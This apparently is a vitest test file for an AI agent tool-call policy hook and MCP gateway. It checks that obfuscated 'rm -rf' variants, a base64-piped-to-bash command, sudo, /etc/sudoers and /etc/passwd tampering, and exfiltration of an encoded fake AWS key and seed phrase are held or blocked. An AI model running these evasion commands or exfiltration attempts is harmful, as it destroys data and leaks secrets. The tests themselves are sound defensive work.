import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { spawn, spawnSync } from 'child_process';
import { createInterface } from 'readline';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { keySafeEnv } from './helpers/env';
import { createHash } from 'node:crypto';
import { BIP39_ENGLISH } from '../../packages/policy-engine/src/dlp/bip39-english';

const cli = path.resolve(__dirname, '../../dist/cli.js');
const token = ['AKIA', 'ZBCDEFGH', 'JKLM2345'].join('');
const encoded = Buffer.from(token).toString('base64');
let home: string;

beforeEach(() => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'node9-issue338-'));
  fs.mkdirSync(path.join(home, '.node9'));
  fs.writeFileSync(
    path.join(home, '.node9/config.json'),
    JSON.stringify({
      settings: {
        mode: 'standard',
        autoStartDaemon: false,
        approvalTimeoutMs: 0,
        approvers: { native: false, browser: false, cloud: false, terminal: false },
      },
      policy: {
        loopDetection: { enabled: false },
        toolInspection: {
          mcp__ci__run: { kind: 'shell', field: 'input.script' },
        },
      },
    })
  );
});
afterEach(() => fs.rmSync(home, { recursive: true, force: true }));

function run(argv: string[], input?: string) {
  const result = spawnSync(process.execPath, [cli, ...argv], {
    cwd: home,
    encoding: 'utf8',
    timeout: 20_000,
    input,
    env: {
      ...keySafeEnv(),
      HOME: home,
      USERPROFILE: home,
      NODE9_TESTING: '1',
      NODE9_NO_AUTO_DAEMON: '1',
    },
  });
  expect(result.error).toBeUndefined();
  expect(result.status).not.toBeNull();
  return result;
}

function check(tool: string, args: object) {
  const payload = JSON.stringify({
    hook_event_name: 'PreToolUse',
    tool_name: tool,
    tool_input: args,
    session_id: 'issue338',
    tool_use_id: 'issue338-call',
    cwd: home,
  });
  // Windows caps a command line near 32 KB; large payloads go through stdin,
  // which is how the agents deliver hook input anyway.
  const result =
    payload.length > 16_000
      ? run(['check', '--agent', 'claude'], payload)
      : run(['check', '--agent', 'claude', payload]);
  expect(result.stderr).toBe('');
  return { status: result.status, body: result.stdout.trim() ? JSON.parse(result.stdout) : null };
}

function mnemonicFixture(): string {
  const entropy = createHash('sha256')
    .update('node9 synthetic hook mnemonic')
    .digest()
    .subarray(0, 16);
  const bits =
    [...entropy].map((b) => b.toString(2).padStart(8, '0')).join('') +
    createHash('sha256').update(entropy).digest()[0].toString(2).padStart(8, '0').slice(0, 4);
  return bits
    .match(/.{11}/g)!
    .map((v) => BIP39_ENGLISH[parseInt(v, 2)])
    .join(' ');
}

describe('Issue 338 through the built hook', () => {
  it.each([
    ['mcp__ops__exec', { command: 'sudo whoami' }],
    ['mcp__ops__exec', { cmd: 'sudo whoami' }],
    ['mcp__ci__run', { input: { script: 'sudo whoami' } }],
  ])('asks for shell policy through %s', (tool, args) => {
    const result = check(tool as string, args as object);
    expect(result.status).toBe(0);
    expect(result.body.hookSpecificOutput.permissionDecision).toBe('ask');
  });
  it.each([
    '`printf rm` -rf /important/data',
    '$(printf rm) -rf /important/data',
    '/bin/{rm,} -rf /tmp/sensitive',
    'IFS=,;CMD=r,m;$CMD -rf /data',
    "$'\\162\\155' -rf /home/user/.ssh",
    'echo cm0gLXJmIC9kYXRh | base64 -d | bash',
  ])('requires approval for generated executable code: %s', (command) => {
    const result = check('mcp__ops__exec', { command });
    expect(result.body.hookSpecificOutput.permissionDecision).toBe('ask');
  });
  it('blocks a generated mnemonic and keeps it out of audit and response', () => {
    const phrase = mnemonicFixture();
    const encodedPhrase = Buffer.from(phrase).toString('base64');
    const result = check('mcp__ops__send_message', { body: encodedPhrase });
    expect(result.body.hookSpecificOutput.permissionDecision).toBe('deny');
    const audit = fs.readFileSync(path.join(home, '.node9/audit.log'), 'utf8');
    for (const output of [audit, JSON.stringify(result.body)]) {
      expect(output).not.toContain(phrase);
      expect(output).not.toContain(encodedPhrase);
    }
  });
  it('allows find to move ordinary files without inventing root removal', () => {
    expect(
      check('Bash', { command: 'find /workspace -maxdepth 1 -type f -exec mv {} / \\;' })
    ).toEqual({ status: 0, body: null });
  });
  it('requires a decision on ambiguous executable arguments', () => {
    const result = check('mcp__ops__exec', { command: 'ls', cmd: 'pwd' });
    expect(result.body.hookSpecificOutput.permissionDecision).toBe('ask');
    expect(JSON.stringify(result.body)).toContain('could not be inspected');
  });
  it('allows the benign command control', () => {
    expect(check('mcp__ops__exec', { command: 'ls' })).toEqual({ status: 0, body: null });
  });
  it.each(['WebFetch', 'mcp__ops__send_message'])('blocks an encoded secret through %s', (tool) => {
    const result = check(tool, { url: 'https://fixture.invalid/?data=' + encoded });
    expect(result.status).toBe(2);
    expect(result.body.hookSpecificOutput.permissionDecision).toBe('deny');
    const audit = fs.readFileSync(path.join(home, '.node9/audit.log'), 'utf8');
    for (const text of [JSON.stringify(result.body), audit]) {
      expect(text).not.toContain(token);
      expect(text).not.toContain(encoded);
    }
  });
  it('requires review for an incomplete argument scan', () => {
    const deep = JSON.parse('{"a":'.repeat(14) + '1' + '}'.repeat(14));
    const result = check('WebFetch', { prompt: deep });
    expect(result.body.hookSpecificOutput.permissionDecision).toBe('ask');
  });
  it('allows a large ordinary write whose raw text was fully inspected', () => {
    expect(check('Write', { file_path: 'notes.md', content: 'x'.repeat(105_000) })).toEqual({
      status: 0,
      body: null,
    });
  });
  // The protected-file policy is POSIX-only.
  it.skipIf(process.platform === 'win32')(
    'holds a long pattern the matcher cannot compile instead of failing open',
    () => {
      const result = check('Bash', { command: 'rm /etc/' + 'a'.repeat(70_000) + '*' });
      expect(result.body.hookSpecificOutput.permissionDecision).toBe('ask');
      expect(
        check('Bash', { command: 'echo x >> /etc/sudoers; : > /etc/[a' + 'b'.repeat(70_000) + ']' })
          .status
      ).toBe(2);
    }
  );
});

describe('Issue 338 through the real MCP gateway', () => {
  it('does not forward blocked calls and preserves the original allowed payload', async () => {
    const script = path.join(home, 'upstream.cjs');
    const calls = path.join(home, 'executed.jsonl');
    fs.writeFileSync(
      script,
      `
const fs = require('fs');
require('readline').createInterface({ input: process.stdin }).on('line', line => {
  const m = JSON.parse(line);
  if (m.method === 'tools/list') {
    process.stdout.write(JSON.stringify({jsonrpc:'2.0', id:m.id, result:{tools:['exec','send_message'].map(name => ({name, inputSchema:{type:'object'}}))}}) + '\\n');
  } else if (m.method === 'tools/call') {
    fs.appendFileSync(${JSON.stringify(calls)}, JSON.stringify(m.params) + '\\n');
    process.stdout.write(JSON.stringify({jsonrpc:'2.0', id:m.id, result:{content:[{type:'text',text:'ok'}]}}) + '\\n');
  }
});
`
    );
    const messages = [
      { name: 'exec', arguments: { cmd: 'ls', marker: 'original' } },
      { name: 'send_message', arguments: { body: encoded } },
      // The protected-file policy is POSIX-only; on win32 legacy rules decide.
      ...(process.platform === 'win32'
        ? []
        : [{ name: 'exec', arguments: { command: 'rm /etc/passwd' } }]),
      { name: 'exec', arguments: { command: '$(printf rm) -rf /important/data' } },
      {
        name: 'send_message',
        arguments: { body: Buffer.from(mnemonicFixture()).toString('base64') },
      },
    ];
    const child = spawn(
      process.execPath,
      [cli, 'mcp-gateway', '--upstream', `"${process.execPath}" "${script}"`],
      {
        cwd: home,
        stdio: ['pipe', 'pipe', 'pipe'],
        env: {
          ...keySafeEnv(),
          HOME: home,
          USERPROFILE: home,
          NODE9_TESTING: '1',
          NODE9_NO_AUTO_DAEMON: '1',
        },
      }
    );
    let stderr = '';
    child.stderr.on('data', (chunk) => {
      stderr += chunk;
    });
    const readers = createInterface({ input: child.stdout })[Symbol.asyncIterator]();
    const close = new Promise<number | null>((resolve, reject) => {
      child.on('error', reject);
      child.on('close', resolve);
    });
    const timeout = setTimeout(() => child.kill(), 15_000);
    const request = async (id: number, method: string, params?: object) => {
      child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n');
      const line = await readers.next();
      expect(line.done, stderr).toBe(false);
      const reply = JSON.parse(line.value!);
      expect(reply.id).toBe(id);
      return reply;
    };
    try {
      expect((await request(0, 'tools/list')).result.tools).toHaveLength(2);
      expect((await request(1, 'tools/call', messages[0])).result).toBeDefined();
      for (const [i, message] of messages.slice(1).entries())
        expect((await request(i + 2, 'tools/call', message)).error).toBeDefined();
      child.stdin.end();
      expect(await close, stderr).toBe(0);
    } finally {
      clearTimeout(timeout);
      if (child.exitCode === null) child.kill();
      await close;
    }
    expect(
      fs
        .readFileSync(calls, 'utf8')
        .trim()
        .split('\n')
        .map((line) => JSON.parse(line))
    ).toEqual([messages[0]]);
  });
});
